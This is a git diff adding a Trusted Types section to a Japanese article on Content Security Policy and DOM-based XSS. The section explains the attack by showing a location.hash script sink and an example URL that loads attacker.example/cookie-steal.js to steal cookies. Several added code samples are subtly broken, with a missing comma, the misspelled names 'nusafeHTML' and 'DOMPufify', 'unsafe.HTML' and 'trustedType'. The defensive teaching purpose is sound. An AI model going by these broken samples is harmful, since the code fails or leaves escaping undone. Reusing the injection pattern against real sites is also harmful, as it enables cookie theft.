@@ -220,8 +220,8 @@ Content-Security-Policy: script-src 'nonce-tXCHNF14TxHbBvCj3G0WmQ=='
 
 ```html
 <!-- nonceが付与されているため実行されるJavaScriptファイル -->
-<script src=./allowed.jsnonce="tXCHNF14TxHbBvCj3G0WmQ=="></script>
-<script src=https://crossorigin.example/allowed.jsnonce="tXCHNF14TxHbBvCj3G0WmQ=="></script>
+<script src="./allowed.js" nonce="tXCHNF14TxHbBvCj3G0WmQ=="></script>
+<script src="https://crossorigin.example/allowed.js" nonce="tXCHNF14TxHbBvCj3G0WmQ=="></script>
 
 <!-- nonceが付与されていないため実行されないJavaScriptファイル -->
 <script src=./notallowed.js></script>
@@ -291,7 +291,7 @@ Content-Security-Policy: script-src 'nonce-tXCHNF14TxHbBvCj3G0WmQ==' 'strict-dyn
 
 ```html
 <script nonce="tXCHNF14TxHbBvCj3G0WmQ==">
-  const s = `<script src="https://cross-origin.example/main.js"></script>`;
+  const s = '<script src="https://cross-origin.example/main.js"></script>';
   // `innerHTML` は禁止されているため、`script` 要素はHTMLへ挿入されない
   document.querySelector("#inserted-script").innerHTML = s;
 </script>
@@ -318,6 +318,170 @@ Content-Security-Policy: script-src 'nonce-tXCHNF14TxHbBvCj3G0WmQ==' 'strict-dyn
 
 注意点として、**`<meta>` タグを使用して CSP を指定する場合、全てのディレクティブが使用できるわけではない**。
 `frame-ancestors` や `report-uri` ディレクティブは使用できない。
+
+## Trusted Types
+
+Strict CSP は強力な XSS 対策であるが、開発者の実装次第で DOM-based XSS が発生する恐れがある。
+
+```html
+<script nonce="tXCHNF14TxHbBvCj3G0WmQ==">
+  const s = document.createElement("script");
+  s.src = location.hash.slice(1);
+  document.body.appendChild(s);
+</script>
+```
+
+上記コードにおいて、`https://site.example#https://attacker.example/cookie-steal.js` のような URL へ誘導された場合、以下のような HTML が生成され、攻撃者が用意した `cookie-steal.js` というスクリプトが実行されてしまう。
+
+```html
+<script src="https://attacker.example/cookie-steal.js"></script>
+```
+
+- DOM-based XSS は文字列をそのまま HTML へ反映してしまうことが原因で発生する
+- 今回だと、`location.hash.slice(1)` で取得した文字列をそのまま使用していることが原因
+
+**Trusted Types** という機能を使用することで、 DOM のプロパティなどが**任意の文字列を受け取ることを禁止**し、特定の関数を通過した**検証済みの文字列のみを許容**させることができる。
+
+### Trusted Types の有効化
+
+CSP ヘッダに `require-trusted-types-for 'script'` を指定する。
+
+```http
+Content-Security-Policy: require-trusted-types-for 'script';
+```
+
+すると、以下のような `<script>` 要素の生成も Trusted Types が有効なページでは、`location.hash.slice(1)` で取得した文字列をそのまま `src` 属性に代入することができず、エラーになる。
+
+```html
+<script>
+  const s = document.createElement("script");
+  // 次の行でエラーになる
+  s.src = location.hash.slice(1);
+  document.body.appendChild(s);
+</script>
+```
+
+### ポリシー関数の定義
+
+- Trusted Types は「**ポリシー**」と呼ばれる関数によって検査された安全な型（文字列）のみを HTML へ挿入できるように制限する
+- Trusted Types は文字列を **`TrustedHTML`**、 **`TrustedScript`**、**`TrustedScriptURL`** の 3 つの型（文字列）に変換する
+- 先ほど例に挙げた Trusted Types が有効なページでは、`<script>` 要素の `src` 属性には `TrustedScriptURL` 型の値しか代入できない
+- よって、ポリシー関数を定義し、文字列を安全な型に変換する必要がある
+- ポリシー関数の作成には、`window.trustedTypes.createPolicy()` を使用する
+
+```html
+<script>
+  // Trusted Typesをサポートしているブラウザのみ一連の処理を行う
+  if (window.trustedTypes && trustedTypes.createPolicy) {
+    // `createPolicy()`の引数に`(ポリシー名, ポリシー関数を持つオブジェクト)`を指定
+    const myPolicy = trustedTypes.createPolicy("my-policy", {
+      createScriptURL: (unsafeString) => {
+        const url = new URL(unsafeString, location.origin);
+
+        //　現在のページと`<script>`要素へ指定するURLのオリジンが一致するかチェック
+        if (location.origin !== url.origin) {
+          // 同一オリジンでない場合はエラー
+          throw new Error("同一オリジン以外のscriptは読み込めません。");
+        }
+        // returnされたURLオブジェクトは安全とみなされる
+        return url;
+      },
+    });
+
+    const s = document.createElement("script");
+    // ポリシー関数を呼び出し、TrustedScriptURL型の結果を代入する
+    s.src = myPolicy.createScriptURL(location.hash.slice(1));
+    document.body.appendChild(s);
+  }
+</script>
+```
+
+- `trustedTypes.createPolicy()` の第一引数に指定するポリシー名は任意のもので構わない
+- 第二引数には、文字列を検査するための関数を定義したオブジェクトを設定する
+- オブジェクトには以下の関数を定義することができる
+
+| ポリシー関数      | 役割                                                              |
+| ----------------- | ----------------------------------------------------------------- |
+| `createHTML`      | HTML 文字列を検査して `TrustedHTML` へ変換                        |
+| `createScript`    | スクリプトの文字列を検査して `TrustedScript` へ変換               |
+| `createScriptURL` | スクリプトの読み込み先の URL を検査して `TrustedScriptURL` へ変換 |
+
+- これらのメソッドを通した値は Trusted（信頼できる）な型になる
+- それぞれのメソッドを通すことで、信頼できる HTML（`TrustedHTML`）や、信頼できる URL（`TrustedScriptURL`）を得ることができる
+
+次に、CSP ヘッダの `trusted-types` ディレクティブにポリシー名を指定する。
+
+```http
+Content-Security-Policy: require-trusted-types-for 'script'; trusted-types my-policy
+```
+
+指定したポリシー名以外のポリシー関数が存在した場合、エラーになる。
+
+また、ポリシー関数の中では [DOMPurify](https://github.com/cure53/DOMPurify) などのライブラリを使用することも可能。
+
+```js
+const myPolicy = trustedTypes.createPolicy("my-policy", {
+  createHTML: (unsafeHTML) => DOMPurify.sanitize(unsafeHTML),
+});
+
+const untrustedHTML = decodeURIComponent(location.hash.slice(1));
+// HTML文字列を検査して`TrustedHTML`へ変換
+const trustedHTML = myPolicy.createHTML(untrustedHTML);
+// `TrustedHTML`は`innerHTML`などで挿入可能
+el.innerHTML = trustedHTML;
+```
+
+ポリシーは以下のように複数定義することも可能。
+
+```js
+// エスケープ処理を行うポリシー
+const escapePolicy = trustedTypes.createPolicy("escape", {
+  createHTML: (unsafeHTML) =>
+    unsafe.HTML.replace(/&/g, "&amp;")
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;")
+      .replace(/"/g, "&quot;")
+      .replace(/'/gm "&#x27;")
+});
+
+// サニタイズを行うポリシー
+const sanitizePolicy = trustedTypes.createPolicy("sanitize", {
+  createHTML: (nusafeHTML) => DOMPurify.sanitize(unsafeHTML)
+});
+```
+
+```http
+Content-Security-Policy: require-trusted-types-for 'script'; trusted-types escape sanitize
+```
+
+### デフォルトポリシー
+
+- `trustedType.createPolicy()` の第一引数に `default` を指定すると、Trusted Types のデフォルトポリシーを定義できる
+- デフォルトポリシは Trusted ではない普通の文字列が代入された時に、自動的に適用する処理を記述する
+- Trusted Types でない文字列が代入された際に、自動的に検査してくれる
+
+```js
+trustedTypes.createPolicy("default", {
+  createHTML: (unsafeHTML) => DOMPufify.sanitize(unsafeHTML),
+});
+
+// デフォルトポリsーによって自動的に`TrustedHTML`へ変換されて代入される
+el.innerHTML = decodeURIComponent(location.hash.slice(1));
+```
+
+```http
+Content-Security-Policy: require-trusted-types-for 'script'; trusted-types default
+```
+
+- ポリシー関数の作成や既存コードの修正をしなくてもデフォルトポリシーを追加するだけで、Trusted Types を適用できる
+- しかし、代入する文字列全てに適用されるため、Trusted Types の影響でシステムの動作が壊れてしまっても気づきにくい
+
+:::message
+
+- Trusted Type は DOM-based XSS を根絶するための強力な機能
+- しかし、実装漏れがあるとシステムの動作を壊しかねない
+
+:::
 
 ## `<meta>` タグとレスポンスヘッダーのどちらで CSP 設定すべきか？
 
